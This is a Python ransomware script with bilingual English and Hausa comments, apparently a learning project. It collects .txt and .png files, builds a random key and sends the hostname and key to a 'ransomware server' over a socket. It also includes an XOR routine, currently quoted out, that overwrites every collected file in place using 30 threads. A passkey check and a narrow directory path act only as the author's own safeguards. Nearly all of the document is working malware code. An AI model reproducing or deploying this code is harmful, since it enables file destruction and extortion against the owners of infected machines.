# Put a safeguard at the beginning 
# Saka tsaro a farko domin kada in kullle files dina bisa kuskure

# supply file extensions to encrypt
# Bayar da inkiyar file din da nake son rufewa (.txt, .mp3 etc)

# Grab all files from machine and put them in a list
# Tattaro dukkannin files din computer gaba daya in saka su a list.

# Generate a key
# Kirkira mukulli domin kulle files din

# Send hostname and key back to server
# Tura mukullin da muka rufe files din mu zuwa wata server(computer)

# Encrypt all files in list
# Kulle duk wani files din da muka saka a cikin list a sama

import os                           # domin aiki da host dinmu wajan iya shiga cikin path din da akwai
import random                       # domin kirkiran key din da zai hargitsa muna files dinmu. da kuma kirkiran mukulli
import socket                       # Domin aiki da wata server din musan man wajan mu'amala da wata computer din
from datetime import datetime       # domin sanin kwanan watan da aka kulle files din da lokacin da aka kulle
from threading import Thread        # domin ya kulle muna files daya cikin kankanin lokaci
from queue import Queue             # domin saka aiki a cikin layi sabida yayi shi da sauri
import time


# Goge rubutun dake command prompt / terminal idan da akwai 
os.system("cls" if os.name == 'nt' else "clear")

# Safeguard in order to avoid encrypting my files locally.
tsaro = input("Please enter a passkey: ")
if tsaro != "start":
    quit()

# File extensions to encrypt if found in machine
encrypted_ext = ('.txt', '.png',)

#Grab all files from machine     C:\Users\cyberxploit\Desktop\RANSOMEWARE\commands
file_paths = []
#for root, dirs, files in os.walk("C:\\"):
path = "C:/Users/cyberxploit/Desktop/RANSOMEWARE"
for root, dirs, files in os.walk(path):
    for file in files:
        file_path, file_ext = os.path.splitext(root + "\\" + file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)

# for f in file_paths:
#     print(f)
    #with open('all_txt.logs', 'a') as content:
        #content.write(f)
   

# Generate a key
key = ''
encryption_level = 128 // 8
char_pool = ''
for i in range(0x00, 0xFF):
    char_pool += (chr(i))

#print(char_pool)
for i in range(encryption_level):
    key += random.choice(char_pool)
#print(key)


hostname = os.getenv("COMPUTERNAME")
print(hostname)

#connect to ransomeware server and send  the hostname and key that is generated
#ip = "192.168.43.112"
host = socket.gethostname()
port = 5678
time = datetime.now()



with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    message = s.recv(1024)
    print(message.decode("utf-8"))
    s.send(f"[TIME:{time}] - HOSTNAME:{hostname} - KEY:{key}".encode("utf-8"))

"""
# Encrypting files 
def encrypt(key):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index +=1
        except:
            print(f"Failed to encrypt file {file}")
        q.task_done()

q = Queue()
for file in file_paths:
    q.put(file)

for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()

q.join()
print("Encryption done successfully")

"""